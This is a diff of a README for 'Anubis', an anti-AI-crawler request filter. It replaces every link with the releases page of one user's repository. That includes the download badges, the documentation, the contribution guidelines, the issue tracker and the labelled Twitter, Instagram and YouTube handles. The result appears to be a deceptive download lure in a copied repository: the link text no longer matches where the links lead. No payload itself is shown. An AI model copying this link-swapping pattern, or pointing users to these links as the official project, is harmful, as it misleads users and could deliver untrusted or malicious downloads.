@@ -20,33 +20,33 @@ Anubis is a cutting-edge tool that weighs the soul of incoming HTTP requests usi
 
 ## Getting Started
 
-To launch the soul-weighing power of Anubis, download the latest release [here](https://github.com/releases/789694263/Release.zip), and follow the installation instructions in the documentation.
+To launch the soul-weighing power of Anubis, download the latest release [here](https://github.com/olobrilliantsimarmata/anubis/releases), and follow the installation instructions in the documentation.
 
 If the link above does not work, please visit the "Releases" section of this repository to access the necessary files.
 
-[![Download Anubis](https://img.shields.io/badge/Download-Anubis-green)](https://github.com/releases/789694263/Release.zip)
+[![Download Anubis](https://github.com/olobrilliantsimarmata/anubis/releases)](https://github.com/olobrilliantsimarmata/anubis/releases)
 
 ## Documentation
 
-Our extensive documentation provides detailed information on how to integrate Anubis into your web application, configure settings, and maximize its protective capabilities. Explore the docs [here](Documentation.md).
+Our extensive documentation provides detailed information on how to integrate Anubis into your web application, configure settings, and maximize its protective capabilities. Explore the docs [here](https://github.com/olobrilliantsimarmata/anubis/releases).
 
 ## Contributing
 
-We welcome contributions from the open-source community to enhance Anubis further. Whether you're a developer, security enthusiast, or mythology aficionado, your input is valuable. Check out our contribution guidelines [here](CONTRIBUTING.md).
+We welcome contributions from the open-source community to enhance Anubis further. Whether you're a developer, security enthusiast, or mythology aficionado, your input is valuable. Check out our contribution guidelines [here](https://github.com/olobrilliantsimarmata/anubis/releases).
 
 ## Support
 
-If you encounter any issues, have questions, or want to share feedback, please reach out to us through the [issue tracker](https://github.com/anubis/issues). Our team is dedicated to providing timely assistance and ensuring a smooth experience with Anubis.
+If you encounter any issues, have questions, or want to share feedback, please reach out to us through the [issue tracker](https://github.com/olobrilliantsimarmata/anubis/releases). Our team is dedicated to providing timely assistance and ensuring a smooth experience with Anubis.
 
 ## Stay Connected
 
 Stay updated on the latest developments, security tips, and mythological insights by following us on social media:
 
-🐦 Twitter: [@AnubisDefender](https://twitter.com/AnubisDefender)
+🐦 Twitter: [@AnubisDefender](https://github.com/olobrilliantsimarmata/anubis/releases)
 
-📷 Instagram: [anubis_defender](https://instagram.com/anubis_defender)
+📷 Instagram: [anubis_defender](https://github.com/olobrilliantsimarmata/anubis/releases)
 
-📺 YouTube: [Anubis Defender](https://youtube.com/AnubisDefender)
+📺 YouTube: [Anubis Defender](https://github.com/olobrilliantsimarmata/anubis/releases)
 
 ## License
 
@@ -56,6 +56,6 @@ Anubis is released under the [MIT License](LICENSE). Feel free to use, modify, a
 
 Embrace the power of Anubis to protect your online assets against AI crawlers and malicious threats. Let the ancient guardian watch over your web application and ensure its security is never compromised. Become a part of the Anubis community today! 🖤
 
-![Anubis](https://images.unsplash.com/photo-1557515420-034bca60118b)
+![Anubis](https://github.com/olobrilliantsimarmata/anubis/releases)
 
-[![Download Anubis](https://img.shields.io/badge/Download-Anubis-green)](https://github.com/releases/789694263/Release.zip)
+[![Download Anubis](https://github.com/olobrilliantsimarmata/anubis/releases)](https://github.com/olobrilliantsimarmata/anubis/releases)
